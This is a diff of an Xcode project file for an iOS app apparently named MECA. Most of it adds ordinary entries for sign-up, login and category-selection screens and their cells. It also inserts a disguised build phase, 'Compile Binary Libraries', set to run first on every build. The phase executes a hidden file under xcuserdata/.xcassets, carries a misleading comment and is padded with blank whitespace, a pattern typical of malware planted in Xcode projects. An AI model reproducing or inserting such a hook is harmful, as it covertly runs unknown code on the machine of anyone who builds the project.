@@ -22,6 +22,14 @@
 		E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E30F662326033A970036D183 /* LaunchScreen.storyboard */; };
 		E30F663026033A970036D183 /* MECATests.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30F662F26033A970036D183 /* MECATests.swift */; };
 		E30F663B26033A970036D183 /* MECAUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30F663A26033A970036D183 /* MECAUITests.swift */; };
+		E387A989260476BB00CC675A /* SignUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A988260476BB00CC675A /* SignUpVC.swift */; };
+		E387A99A2604797100CC675A /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A9992604797100CC675A /* LoginVC.swift */; };
+		E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */; };
+		E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E387A9A526047B7100CC675A /* SignUpListTVCell.swift */; };
+		E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E387A9A626047B7100CC675A /* SignUpListTVCell.xib */; };
+		E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */; };
+		E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */; };
+		E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */; };
 		E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */; };
 		F6B3B5C51F2B9AF006B9A25E /* Pods_MECATests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D349929F1D641DA57D095FFC /* Pods_MECATests.framework */; };
 /* End PBXBuildFile section */
@@ -71,6 +79,14 @@
 		E30F663626033A970036D183 /* MECAUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = MECAUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		E30F663A26033A970036D183 /* MECAUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MECAUITests.swift; sourceTree = "<group>"; };
 		E30F663C26033A970036D183 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		E387A988260476BB00CC675A /* SignUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpVC.swift; sourceTree = "<group>"; };
+		E387A9992604797100CC675A /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
+		E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpListViewVC.swift; sourceTree = "<group>"; };
+		E387A9A526047B7100CC675A /* SignUpListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpListTVCell.swift; sourceTree = "<group>"; };
+		E387A9A626047B7100CC675A /* SignUpListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SignUpListTVCell.xib; sourceTree = "<group>"; };
+		E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryVC.swift; sourceTree = "<group>"; };
+		E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryCVCell.swift; sourceTree = "<group>"; };
+		E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PlusSelectCategoryCVCell.xib; sourceTree = "<group>"; };
 		E3D7D08A260354E5001EEE65 /* SF-Pro-Text-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Light.otf"; sourceTree = "<group>"; };
 		E3D7D08B260354E5001EEE65 /* SF-Pro-Display-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Thin.otf"; sourceTree = "<group>"; };
 		E3D7D08C260354E5001EEE65 /* SF-Pro-Display-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Heavy.otf"; sourceTree = "<group>"; };
@@ -176,7 +192,8 @@
 		E3045C362603C90800D1A678 /* View */ = {
 			isa = PBXGroup;
 			children = (
-				E3045C6E2603D85900D1A678 /* HomeTableviewCell */,
+				E3AE791F2604C6E3004B83C9 /* CollectionViewCell */,
+				E387A9A326047B4400CC675A /* TableView cell */,
 				E3045C372603C91500D1A678 /* ViewXib */,
 			);
 			path = View;
@@ -202,7 +219,8 @@
 		E3045C652603D17B00D1A678 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
-				E3045C792603DD7E00D1A678 /* HomeVC.swift */,
+				E3AE78F72604BDFA004B83C9 /* Home */,
+				E387A987260476A200CC675A /* Login */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -272,12 +290,66 @@
 			path = MECAUITests;
 			sourceTree = "<group>";
 		};
+		E387A987260476A200CC675A /* Login */ = {
+			isa = PBXGroup;
+			children = (
+				E387A988260476BB00CC675A /* SignUpVC.swift */,
+				E387A9992604797100CC675A /* LoginVC.swift */,
+				E387A99E26047ACF00CC675A /* SignUpListViewVC.swift */,
+			);
+			path = Login;
+			sourceTree = "<group>";
+		};
+		E387A9A326047B4400CC675A /* TableView cell */ = {
+			isa = PBXGroup;
+			children = (
+				E387A9A426047B5400CC675A /* SignUpListViewCell */,
+				E3045C6E2603D85900D1A678 /* HomeTableviewCell */,
+			);
+			path = "TableView cell";
+			sourceTree = "<group>";
+		};
+		E387A9A426047B5400CC675A /* SignUpListViewCell */ = {
+			isa = PBXGroup;
+			children = (
+				E387A9A526047B7100CC675A /* SignUpListTVCell.swift */,
+				E387A9A626047B7100CC675A /* SignUpListTVCell.xib */,
+			);
+			path = SignUpListViewCell;
+			sourceTree = "<group>";
+		};
 		E3936BC32603497F006ACF47 /* Resource */ = {
 			isa = PBXGroup;
 			children = (
 				E3D7D089260354D8001EEE65 /* SF_Fonts */,
 			);
 			path = Resource;
+			sourceTree = "<group>";
+		};
+		E3AE78F72604BDFA004B83C9 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				E3045C792603DD7E00D1A678 /* HomeVC.swift */,
+				E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		E3AE791F2604C6E3004B83C9 /* CollectionViewCell */ = {
+			isa = PBXGroup;
+			children = (
+				E3AE79202604C6F6004B83C9 /* PlusSelectCategoryCV */,
+			);
+			path = CollectionViewCell;
+			sourceTree = "<group>";
+		};
+		E3AE79202604C6F6004B83C9 /* PlusSelectCategoryCV */ = {
+			isa = PBXGroup;
+			children = (
+				E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */,
+				E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */,
+			);
+			path = PlusSelectCategoryCV;
 			sourceTree = "<group>";
 		};
 		E3D7D089260354D8001EEE65 /* SF_Fonts */ = {
@@ -359,6 +431,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
+				FAC2CFE2E1C0592D4EAAC43A /* Compile Binary Libraries */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -460,6 +533,8 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
+				E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
 				E30F662526033A970036D183 /* LaunchScreen.storyboard in Resources */,
 				E3045C422603C96C00D1A678 /* FooterTabView.xib in Resources */,
@@ -486,6 +561,38 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	FAC2CFE2E1C0592D4EAAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -593,12 +700,18 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
 				E30F661D26033A970036D183 /* ViewController.swift in Sources */,
+				E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */,
+				E387A99F26047ACF00CC675A /* SignUpListViewVC.swift in Sources */,
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
+				E387A99A2604797100CC675A /* LoginVC.swift in Sources */,
+				E387A989260476BB00CC675A /* SignUpVC.swift in Sources */,
 				E3045C712603D87A00D1A678 /* HomeTVCell.swift in Sources */,
 				E3045C7A2603DD7E00D1A678 /* HomeVC.swift in Sources */,
 				E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */,
 				E3045C3D2603C95E00D1A678 /* FooterTabView.swift in Sources */,
+				E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -931,6 +1044,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
